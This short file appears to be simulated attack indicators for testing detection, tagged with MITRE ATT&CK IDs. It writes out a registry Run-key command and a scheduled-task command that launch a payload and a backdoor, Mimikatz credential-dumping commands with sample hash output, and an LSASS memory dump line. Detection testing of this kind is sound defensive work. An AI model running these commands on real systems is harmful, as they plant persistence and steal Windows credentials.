# Simulated persistence + credential access indicators
# T1547.001: Registry Run key persistence
# T1003.001: LSASS access / Mimikatz strings
# T1053.005: Scheduled task creation

# Persistence via Registry
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateService /t REG_SZ /d "C:\Users\Public\payload.exe"

# Scheduled task creation
schtasks /create /tn "WindowsUpdate" /sc ONLOGON /tr "C:\Windows\Temp\backdoor.exe"

# Mimikatz-style output (credential access simulation)
# sekurlsa::logonpasswords
# lsadump::sam
# * Username : Administrator
# NTLM     : aad3b435b51404eeaad3b435b51404ee

# LSASS memory dump via MiniDumpWriteDump
MiniDumpWriteDump lsass.exe lsass.dmp
